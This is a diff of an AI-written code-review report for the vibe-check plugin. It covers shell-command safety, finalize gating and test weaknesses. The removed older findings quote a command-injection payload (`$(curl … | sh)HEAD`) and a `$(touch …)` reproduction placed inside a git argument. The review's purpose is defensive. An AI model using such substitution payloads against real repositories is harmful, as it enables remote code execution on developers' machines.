@@ -1,150 +1,110 @@
 ---
 phase: 60-exact-change-evidence-and-reliable-finalize
-reviewed: 2026-10-29T00:00:00Z
+reviewed: 2026-10-30T18:34:56Z
 depth: standard
-files_reviewed: 8
+scope: second gap-closure round (60-10..60-13), diff 65bb39d..HEAD
+files_reviewed: 9
 files_reviewed_list:
-  - plugins/vibe-check/scripts/diff_ranges.py
-  - plugins/vibe-check/scripts/test_diff_ranges.py
   - plugins/vibe-check/phases/review/00-scope.md
   - plugins/vibe-check/phases/review/05-state.md
   - plugins/vibe-check/phases/review/30-collect-score.md
   - plugins/vibe-check/phases/shared/90-finalize.md
-  - plugins/vibe-check/scripts/test_finalize_card.py
+  - plugins/vibe-check/scripts/carry_state.py
+  - plugins/vibe-check/scripts/test_carry_state.py
   - plugins/vibe-check/scripts/test_decision_continuity.py
+  - plugins/vibe-check/scripts/test_diff_ranges.py
+  - plugins/vibe-check/scripts/test_finalize_card.py
 findings:
-  critical: 1
-  warning: 3
-  info: 5
-  total: 9
+  critical: 0
+  warning: 2
+  info: 3
+  total: 5
 status: issues_found
 ---
 
-# Phase 60: Code Review Report (gap round 60-06..60-09)
+# Phase 60: Code Review Report (second gap round)
 
-**Reviewed:** 2026-10-29
+**Reviewed:** 2026-10-30T18:34:56Z
 **Depth:** standard
-**Files Reviewed:** 8
+**Files Reviewed:** 9
 **Status:** issues_found
-
-> This report replaces the f442464 review (range `98aa9cc..HEAD`) for the gap-round changes. Scope: `git diff 2f84d2e..HEAD` on the eight files listed above, plus the surrounding code those changes touch. Findings from the earlier review that are still open in the changed code are carried forward and marked "(carried)".
 
 ## Summary
 
-The gap round fixes what it set out to fix. Of the earlier findings, WR-01 (suppressBlankEmpty), WR-02 (colored or non-diff text gives `{}`), WR-03 (textconv / relative), WR-04 (GATEFILE not rebuilt) and WR-06 (cross-call shell variable) are closed. I checked each against real git in a scratch repo. Binary-only and mode-only diffs still give `{}` and are not falsely refused. The six flags are identical, in the same order, on every git range-source line in 00-scope, 05-state and the 30-collect-score table. The suite passes: `pytest -q test_diff_ranges.py test_finalize_card.py test_decision_continuity.py` gives 347 passed, 379 subtests passed.
+The review covered the round's diff (`65bb39d..HEAD`): the new `carry_state.py last-head-sha` subcommand, the 05-state.md step-2 bind fence, the PHASE_START commit-id check in 00-scope.md, the 30-collect-score.md printed-literal rule, the Finalize step-3 GATEFILE re-mint, and the tests behind them. The four test files pass (600 tests, 728 subtests).
 
-Remaining problems:
+**CR-01 (head_sha injection) is closed as far as the row goes.** `last_head_sha` accepts only a str of 40 or 64 lowercase hex characters (`_HEX` is lowercase only) and prints nothing on refusal. The bind fence halts on any non-zero exit, and the fence's own test runs it in a fresh `bash -s` with the real CR-01 payload and checks that no marker file is created. I also searched every other placeholder that takes a value from the state file or from agent output and is substituted into a command (`<file>` in `HEAD:<file>` and `git diff -- <file>`, fix-loop `commit_sha`, `<sha>`). Each is validated before any git call (PATH_RE + guard.py for files; `^[0-9a-f]{40}$` + `cat-file`/`merge-base` for shas), so there is no injection bypass. The PHASE_START regex works under both bash and zsh (checked by hand for the empty, 40-hex, 64-hex and `HEAD` cases). The prose mutant locks I checked (the reinserted `HEAD_SHA_OLD`, the reinserted quotes-alone claim, the removed check line) each trip on their own.
 
-1. **The literal-sha fix opened a command-injection path (CR-01).** The agent now pastes `head_sha` from the state file into a double-quoted shell argument. Double quotes do not stop `$(...)`. I reproduced it: the fence ran the payload and still printed valid ranges with exit 0.
-2. **The six flags do not cover every setting that changes the diff (WR-01).** With `diff.submodule=log`, a change to a submodule alone is refused as "not a unified diff", so the review halts. When other files also change, the submodule's range is silently dropped.
-3. **The new GATEFILE rule is not applied to the post-answer gate re-run (WR-02).** The rebuild paragraph now says the gate must read flags written from fresh counts. The step-3 re-run after recording decisions never says so. If the agent reuses the earlier GATEFILE, the gate decides on counts from before the decisions.
-4. **Temp files are still never removed (WR-03, carried).** The rebuild now leaves even more of them behind.
+**WR-02 (stale GATEFILE) is closed, but the fix exposes an older defect.** Step 3 now gates on a new GATEFILE written from the recounted counts. That recount still reads this attempt's BLOBFILE. The BLOBFILE was minted before the card and the owner's answer, and its fingerprints are now trusted across the whole time the owner spends answering. Before this round, step 3 always stayed blocked, so stale fingerprints there could never lead to a `write`. Now they can (WR-01).
 
-The new tests are mostly real guards: each new mutant (M20–M22) trips against the real module. Two are weaker than they look (IN-02, IN-03).
+The second warning is that the new bind fence also runs on `--finalize`. It turns any non-sha `head_sha` into a hard stop for Finalize, even though Finalize never uses that value (WR-02).
 
-## Critical Issues
-
-### CR-01: Substituting the literal `head_sha` into a double-quoted argument allows command execution
-
-**File:** `plugins/vibe-check/phases/review/05-state.md:52,86`; `plugins/vibe-check/phases/review/30-collect-score.md:72,77`
-**Issue:** 05-state step 2 binds `$LAST_REVIEWED_SHA` from `state.passes[-1].head_sha` in the state JSON. It does not validate the value. The pass ≥ 2 range-source row then has the agent paste that value as a literal into `"<last-reviewed-sha>"`. Double quotes stop word-splitting, but they do not stop `$(...)` or backtick command substitution.
-
-The state file lives at `.turingmind/state/format-53/<key>.json` inside the reviewed repo. Phase 0.7 only *suggests* adding `.turingmind/` to `.gitignore`. A contributor can therefore commit a state file with a predictable key: GSD mode uses `<phase-dir-name>.json`. Its last `head_sha` could be `$(curl … | sh)HEAD`. 90-finalize.md already treats state-derived file paths as possibly attacker-written and checks them with PATH_RE and guard.py before any git call. `head_sha` gets no such check.
-
-Before this round, the row used an unquoted `$LAST_REVIEWED_SHA` that was never bound in the fence's shell. Expanding a variable's value never re-runs `$()`, so the old exposure was option injection at most (earlier IN-02). Literal substitution turns it into command execution. The new paragraph at 30-collect-score.md:77 says the quotes make a bad value fail. That holds for empty and unsubstituted values, but not for this one.
-
-Reproduced in a scratch repo:
-```bash
-set -o pipefail
-RANGES_JSON=$(git diff --no-color --no-ext-diff --no-textconv --no-relative \
-  --src-prefix=a/ --dst-prefix=b/ "$(touch "$T/pwned")HEAD" | python3 diff_ranges.py)
-# -> exit 0, valid ranges printed, and $T/pwned was created
-```
-**Fix:** Validate the value where it is bound, and fail closed:
-```text
-05-state.md step 2: `$LAST_REVIEWED_SHA = state.passes[-1].head_sha` only when it
-matches ^[0-9a-f]{40}([0-9a-f]{24})?$ ; any other value (including null) halts the
-run with a fixed message — never substitute an unvalidated value into a command.
-```
-Also switch the placeholder to single quotes (`'<last-reviewed-sha>'`), or have the fence check it before use with `git rev-parse --verify --quiet --end-of-options '<sha>^{commit}'`. Add a test that substitutes `$(touch marker)HEAD` into the row as the prose directs and asserts the marker file is not created and the fence halts. `<phase-start-sha>` comes from `git log --format=%H`, so it is always hex. Applying the same check to it is cheap and keeps the two rows symmetric.
+## Narrative Findings (AI reviewer)
 
 ## Warnings
 
-### WR-01: `diff.submodule` is not neutralized: a submodule-only change halts the review, and otherwise its range is silently dropped
+### WR-01: Step 3's recount reuses the pre-card BLOBFILE, so a fix-obsolete verdict can close on code edited while the card was open (now reachable as a `write`)
 
-**File:** `plugins/vibe-check/phases/review/30-collect-score.md:66,70-73`; `plugins/vibe-check/scripts/diff_ranges.py:204-216`; `plugins/vibe-check/scripts/test_diff_ranges.py:74-76`
-**Issue:** 30-collect-score.md:66 says the six flags mean "a repo-local … setting cannot change the text the helper reads". `diff.submodule` (user-global or repo-local, values `log` or `diff`) still changes `git diff` output. With `log`, a submodule pointer change prints as `Submodule sub 366ee10..c6092ce:` / `  > c` with no `diff --` header. Reproduced in a scratch repo with the six flags:
-- **Only the submodule changed:** the helper sees no diff structure and raises `REASON_NOT_A_DIFF`, exit 2, so the review pass halts ("Review halted — the changed lines could not be read"). This is a false refusal introduced by this round's not-a-diff rule. Every pass halts for that user until they change their git config.
-- **Submodule plus other files:** exit 0, and the `sub: [[1, 1]]` range the default setting gives is silently dropped.
-- **`diff.submodule=diff`:** the submodule's inner diff is printed under keys such as `sub/f`, which is a different line space from the superproject.
-**Fix:** Add `--submodule=short` to the fixed flag set everywhere it appears: the three 00-scope/05-state lines, the 30-collect-score table and prose, the diff_ranges docstring CLI, and `PROSE_FLAGS`. Add `diff.submodule=log` to `test_hostile_repo_config_does_not_change_ranges`, using a fixture that contains a submodule change, and assert that the raw output really differs, as the other hostile cases do.
+**File:** `plugins/vibe-check/phases/shared/90-finalize.md:272` (with the retry rule at `:67`)
+**Issue:** Step 3 now says: "RE-RUN the counts step ONCE (the same `BLOBFILE=` literal this attempt printed) — the fingerprints have not changed, only the decisions have". That justification does not hold. The BLOBFILE was written in step 1, before the card was shown. Between then and step 3 is a human-length wait while the owner reads and answers the card, and the working tree can change during that wait. Only re-reading HEAD, the index and the working tree can show that the fingerprints are unchanged. The file's own retry rule (line 67) states the invariant this breaks: "Never reuse a `BLOBFILE=` printed by an earlier attempt… its blobs may predate a later edit and would let a fix-obsolete verdict close on changed code."
+Before this round the breach was harmless, because step 3 always gated on the stale GATEFILE and therefore always stayed blocked. With WR-02 fixed, the recount drives the gate. Here is the path:
+1. A fix-obsolete verdict's file is edited during the card wait.
+2. The stale BLOBFILE still holds the old blob, which equals `verified_blob`.
+3. The verdict is honoured, the recount drops to `(0,0,0)`, and the gate returns `write`.
+4. REVIEW.md is written APPROVED and the state is archived, over code that no fingerprint ever judged.
 
-### WR-02: The post-answer gate re-run does not rewrite GATEFILE, so the gate can decide on counts from before the decisions
+The new walk test `test_post_decision_rerun_decides_on_a_fresh_gatefile` writes `{}` to the BLOBFILE, so it cannot see this.
+**Fix:** In step 3, rebuild the fingerprints before the recount, the same way the rebuild-once rule does. Replace the parenthetical and the claim with:
+```text
+Then run step 1 again — a new mktemp fence printing a NEW `BLOBFILE=`, fingerprints rebuilt from the current HEAD, index and working tree — re-run the counts step with that new literal, then run the gate-input fence again so it prints a NEW `GATEFILE=` …
+```
+Then update `STEP3_NEEDLES[0]` in `test_finalize_card.py`, and add a walk subtest in which a fix-obsolete verdict's file is edited after the first BLOBFILE is written: the step-3 recount must not count that verdict as closed.
 
-**File:** `plugins/vibe-check/phases/shared/90-finalize.md:272` (cf. `:55`, `:67`)
-**Issue:** After `record-decisions`, step 3 says: "RE-RUN the counts step and the gate ONCE (the same `BLOBFILE=` literal this attempt printed)". The gate reads only GATEFILE (line 57), and GATEFILE holds the counts written *before* the owner's answers. Step 3 never says to write the recounted `outstanding_cw` / `unacknowledged_medium` / `undecided_nv` into a GATEFILE.
+### WR-02: The new head_sha bind fence also blocks `--finalize`, with no recovery instruction
 
-This round's rebuild rule (line 67) says outright that a GATEFILE built from counts that may predate the current state must not be reused. But it covers only the failure rebuild, and this re-run is "this attempt", so the wording does not forbid reuse here. An agent that re-runs the gate fence as written gets the pre-decision verdict. The result is a "Finalize stays blocked" stop, and the list printed under it comes from the *new* counts, which may be empty. The owner then has to run `--finalize` a second time to get a close-out that should have finished in this turn. `test_finalize_card.py:649` checks only the ordering of this step; nothing walks the re-run against a GATEFILE.
-**Fix:** In step 3, write: "RE-RUN the counts step (the same `BLOBFILE=` literal), then run the gate-input fence again so it prints a NEW `GATEFILE=`, write the seven-key `flags` from the re-counted `$COUNTS_JSON` to it, and run the gate on that literal." Add a fresh-shell walk test in `TestFinalizeFreshShellWalk`: record decisions that close every row, run the gate on the attempt's original GATEFILE, and show it stays blocked. Then run it on a newly written GATEFILE and show it returns `write`. Add a needle or mutant on the new sentence.
-
-### WR-03 (carried, earlier WR-05): Finalize temp files are never removed; the rebuild now leaves twice as many
-
-**File:** `plugins/vibe-check/phases/shared/90-finalize.md:15-22,48-57,67`
-**Issue:** There is still no `rm -f` for `BLOBFILE`, `GATEFILE` or `<GATEFILE>.err`. Card files do get cleanup (lines 175, 243, 271-272). The new rule makes the rebuild mint a second GATEFILE as well as a second BLOBFILE, so a failed-then-rebuilt Finalize leaves up to six `vc.*` files. The same paragraph warns against reusing stale files from "an earlier attempt or an earlier session", and leaving them around invites exactly that. The traceback in `.err` is still never shown or named anywhere.
-**Fix:** As before: after the gate's action is consumed, and on each stop path, run `rm -f '<BLOBFILE>' '<GATEFILE>' '<GATEFILE>.err'` with the printed literals (for the rebuild, both attempts' files). Name the `.err` path in the halt sentence, or keep the file only when the gate exits non-zero.
+**File:** `plugins/vibe-check/phases/review/05-state.md:52-61` (with step 4 at `:97`; `scripts/carry_state.py:1528-1534`)
+**Issue:** Step 2 runs on every run that has a state file, including `FINALIZE_MODE=1` (step 4 says a finalize run "continues to Phase 0.6 and Finalize", so it passes through step 2). Finalize reads `$STATE_FILE`, not the diff, and never uses `$LAST_REVIEWED_SHA`. Yet a last pass whose `head_sha` is anything other than full lowercase hex now stops Finalize with "Review halted — … nothing was scored."
+- **Why this can happen in normal use.** `head_sha` is typed by the agent from `"<current HEAD>"` in 45-persist.md. The schema (`future-schema.json`) requires the key but not its form, so a short sha or `HEAD` written by the agent is a plausible slip.
+- **Why it is new.** `state_reason` accepts such a state, so the `decided`/`deferred` fences did not stop on it before this round.
+- **What the owner sees.** The message gives no way out: it does not say which file to fix, and it does not say that deleting the state file throws away every recorded decision. The result is a stuck Finalize — the "broken required workflow" class.
+**Fix:** Bind `$LAST_REVIEWED_SHA` only when the run needs the incremental range. Wrap the fence in `FINALIZE_MODE=0`, or state in step 2 that a `FINALIZE_MODE=1` run skips this binding. Also make the halt sentence name the cause and a remedy, for example: "… the last pass in `<STATE_FILE>` has no full commit sha; run `/review` once to record a new pass, or restore the file from git." Add a fence test in which a finalize-mode run with `head_sha: "HEAD"` reaches the counts step.
 
 ## Info
 
-### IN-01: "`{}` is printed only for a genuinely empty diff" is not true
+### IN-01: The step-3 "old GATEFILE" mutant does not isolate the `STEP3_OLD` check
 
-**File:** `plugins/vibe-check/phases/review/30-collect-score.md:89`
-**Issue:** By the helper's own contract (diff_ranges.py:23-25, 33) and test (`test_binary_only_and_mode_only_diffs_are_empty`), binary-only, mode-only, deletion-only (`+++ /dev/null`) and C-quoted-path-only diffs also give `{}` with exit 0. The sentence could lead an agent to treat a `{}` from a non-empty diff as an anomaly, or to state that the diff was empty.
-**Fix:** "…so `{}` means no changed text lines the helper can range: an empty diff, or one that changes only binary files, modes, deleted files or C-quoted paths."
+**File:** `plugins/vibe-check/scripts/test_finalize_card.py:1420-1424`
+**Issue:** The mutant replaces `STEP3_NEEDLES[0]` with `STEP3_OLD + …`. The check therefore trips because needle 0 is missing, whether or not the `if STEP3_OLD in line` branch exists. You could delete that branch from `step3_rerun_rule_holds` and the test would still pass. The other two mutant suites in this round (`test_head_sha_mutants_trip` reinserted, `test_substituted_value_mutants_trip` reinserted) do isolate their checks correctly. This is the same weakness R21 records for an earlier check.
+**Fix:** Build the mutant by appending `" " + STEP3_OLD` to the intact line, so every needle is still present and only the old-wording check can trip.
 
-### IN-02: The escape-refusal tests cover only fully colored diffs, so the fail-open case the rule exists for is not locked
+### IN-02: The bind fence's halt sentence blames `head_sha` for every helper failure
 
-**File:** `plugins/vibe-check/scripts/test_diff_ranges.py:437-445,839-843`
-**Issue:** With `color.ui=always`, every line, including `diff --git`, starts with ESC. In that case the new not-a-diff rule refuses the text anyway. M21 (`if False:`) trips only because the expected *reason* changes from `REASON_ESCAPE` to `REASON_NOT_A_DIFF`. The case where the escape rule is the only protection is a partly colored diff, and no test covers it. Example: `color.diff.meta=normal`, so the headers are plain but `@@` is cyan. Reproduced: on that input, the M21 mutant returns `{}` with exit 0 (fail-open), while the real module refuses. A weakened rule, for example one that checks only the first line, would pass the current tests.
-**Fix:** Add a case using `git -c color.ui=always -c color.diff.meta=normal diff HEAD`. Assert that the plain `diff --git` line is present, that the `@@` line starts with ESC, and that the helper refuses with `REASON_ESCAPE`. Point M21 at it.
+**File:** `plugins/vibe-check/phases/review/05-state.md:57`; `scripts/carry_state.py:1529-1531`
+**Issue:** These cases all end in the same sentence, "the state file's last-pass head_sha is not a commit sha":
+- a missing state file (`test_missing_state_file_halts`)
+- invalid JSON
+- an empty `passes` list (`REASON_PASSES`)
 
-### IN-03: Two new checks assert less than they claim
+The helper's real reason does appear on the line above, but the owner-facing sentence is wrong for these cases.
+**Fix:** Use a neutral sentence ("Review halted — the state file's last pass could not be read as a commit sha (the line above says why); nothing was scored."), and update `HEAD_SHA_HALT` in the test.
 
-**File:** `plugins/vibe-check/scripts/test_diff_ranges.py:1141-1152`; `plugins/vibe-check/scripts/test_finalize_card.py:2213-2214`
-**Issue:**
-- `literal_sha_rule_holds` checks that `"substitute"` appears *anywhere* in the range bullet. The word appears four or more times ("substitute it" in both rows, "the agent substitutes" in the new paragraph), and only the sentence mutant is exercised. Deleting the "substitute it" instruction from either row would not trip it.
-- The subtest "old rule: same GATEFILE reused fails identically" runs the same empty file twice and asserts the same halt. Nothing in it reads the prose, so it documents behaviour but guards no rule. The rule itself is guarded only by the RETRY_NEEDLES presence check.
-**Fix:** Assert "substitute" per row (on `prose_range_row(text, "GSD")` and `prose_range_row(text, "default or GSD")`), with a mutant for each. Rename the subtest to say it illustrates the old behaviour, or drop it.
+### IN-03: Step 3 does not say what happens if its recount or gate fails, and its stop sentence would be false
 
-### IN-04 (carried, earlier IN-01): The commit-series refusal recognises only SHA-1 mbox separators
-
-**File:** `plugins/vibe-check/scripts/diff_ranges.py:52`
-**Issue:** `^From [0-9a-f]{40} ` does not match a 64-hex SHA-256 `format-patch` separator. This is unchanged in this round.
-**Fix:** `re.compile(r"^From (?:[0-9a-f]{40}|[0-9a-f]{64}) ")`, plus a mutant test.
-
-### IN-05 (carried, earlier IN-03): The counts fence leaves stderr uncaptured, unlike the gate fence
-
-**File:** `plugins/vibe-check/phases/shared/90-finalize.md:25`
-**Issue:** This is unchanged in this round. The rebuild path now runs the counts fence up to twice, so a `carry_state.py` traceback can reach the owner twice.
-**Fix:** Redirect stderr to a printed file, as the gate fence does, and clean it up under WR-03.
+**File:** `plugins/vibe-check/phases/shared/90-finalize.md:67,272`
+**Issue:** Step 3 adds a second mktemp, Write and gate sequence after the card, but does not say whether the rebuild-once rule applies to it. If the agent applies that rule, its only stop sentence is "nothing was written or archived". By step 3 that is false, because `record-decisions` has already changed the state file.
+**Fix:** Add one clause to step 3: a failure here is not retried, and the stop sentence is "Finalize stopped — your decisions were recorded; nothing else was written or archived; run `--finalize` again."
 
 ## Set aside (needs ruling)
 
-### SA-01 (carried): The Write tool on a file mktemp has already created
+### SA-01: A well-formed but crafted `head_sha` can still narrow the incremental range
 
-**Where:** `plugins/vibe-check/phases/shared/90-finalize.md:15-22,48-55,67`
-**Why excluded:** This depends on how the harness behaves, not on code in the diff.
-**Effect if left as is:** If Write refuses to overwrite an existing file that has not been Read, both the first attempt and the single rebuild fail at the BLOBFILE/GATEFILE write, and Finalize stops. The rebuild now re-mints GATEFILE, so it would hit the same refusal a second time.
-**Needs:** A ruling on whether to confirm with a live run, or to add a "Read the printed path first" step.
-
-### SA-02 (carried): The PR-mode range source fails outright on PRs over GitHub's diff limits
-
-**Where:** `plugins/vibe-check/phases/review/30-collect-score.md:74`
-**Why excluded:** This is an external API limit, and failing closed is the intended behaviour.
-**Effect if left as is:** On very large PRs, every pass halts and nothing is scored.
-**Needs:** A ruling: accept the limit, or add a fallback (fetch the PR refs and run a local `git diff <base>...<head>`).
+**Where:** `plugins/vibe-check/scripts/carry_state.py:1193-1207`; `phases/review/05-state.md:52-61`
+**Why excluded:** CR-01 was about command injection, and the format check closes that. Whether the state file is trusted for scope is a broader question that predates this round.
+**Effect if left as is:** Anyone who can commit the state file into the reviewed repo can set `head_sha` to a real 40-hex commit such as their branch tip. The pass-≥2 range then covers only changes after that commit, so code they already committed is never reviewed — the owner gets a smaller review without being told. `50-fix-loop.md:307` already holds agent-supplied shas to `git cat-file -e "<sha>^{commit}"` + `git merge-base --is-ancestor`. That check would not stop `head_sha = HEAD`, though; only binding the value to something outside the repo (for example, a copy kept outside the working tree) would.
+**Needs:** A ruling from the developer: is the state file's `head_sha` trusted for scope (accept), or should scope binding be planned as a hardening item (defer)?
 
 ---
 
-_Reviewed: 2026-10-29_
+_Reviewed: 2026-10-30T18:34:56Z_
 _Reviewer: Claude (bm-code-reviewer)_
 _Depth: standard_
